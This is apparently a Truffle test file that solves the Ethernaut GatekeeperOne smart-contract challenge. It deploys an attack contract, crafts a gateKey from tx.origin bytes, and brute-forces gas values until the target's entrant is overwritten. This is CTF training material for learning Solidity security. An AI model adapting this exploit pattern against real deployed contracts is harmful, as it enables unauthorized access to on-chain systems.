const GatekeeperOne = artifacts.require("GatekeeperOne");
const AttackGatekeeperOne = artifacts.require("AttackGatekeeperOne");

contract("GatekeeperOne", (accounts) => {
  let gatekeeperInstance;
  let attackInstance;

  before(async () => {
    // Deploy the GatekeeperOne contract
    gatekeeperInstance = await GatekeeperOne.new({ from: accounts[1] });

    // Deploy the AttackGatekeeperOne contract with the address of GatekeeperOne
    attackInstance = await AttackGatekeeperOne.new(gatekeeperInstance.address, {
      from: accounts[0],
    });
  });

  it("should deploy GatekeeperOne and AttackGatekeeperOne contracts", async () => {
    assert(gatekeeperInstance.address !== "", "GatekeeperOne not deployed");
    assert(attackInstance.address !== "", "AttackGatekeeperOne not deployed");
  });

  it("should craft the correct gateKey and pass all gates", async () => {
    // Extract last 2 bytes of tx.origin to form the key
    const txOrigin = accounts[4]; // Replace with your EOA if testing differently
    const txOriginBytes20 = web3.utils.hexToBytes(txOrigin);
    const txOriginBytes2 = txOriginBytes20.slice(18, 20); // Get the last 2 bytes
    const txOriginUint16Hex = web3.utils.bytesToHex(txOriginBytes2); // Convert to hex

    // Construct the gateKey by inserting zeros in between
    const gateKey = `0x000000010000${txOriginUint16Hex.substring(2)}`; // Example key structure based on the rule
    console.log("Crafted gateKey:", gateKey);
    console.log("Crafted gateKey:", accounts[4]);

    // Attempt the attack with the crafted gateKey
    let attackSuccessful = false;
    let successfulGas = 0;

    for (let i = 0; i < 500; i++) {
      const gasAmount = 8191 * 3 + i; // Slightly adjust gas
      try {
        // Call the attack function with the crafted key and specific gas amount
        const tx = await attackInstance.attack(gateKey, gasAmount, {
          from: accounts[4],
        });

        attackSuccessful = true;
        successfulGas = gasAmount;
        break; // Stop the loop if successful
      } catch (error) {}
    }
    console.log("Attack successful with gas:", successfulGas);

    // Check if the attack was ever successful
    assert(
      attackSuccessful,
      "Attack was never successful with any gas value tested"
    );

    // Verify the entrant has been set correctly in the GatekeeperOne contract
    const entrant = await gatekeeperInstance.entrant();
    assert.equal(
      entrant,
      accounts[4],
      "The attacking account did not become the entrant"
    );
  });
});
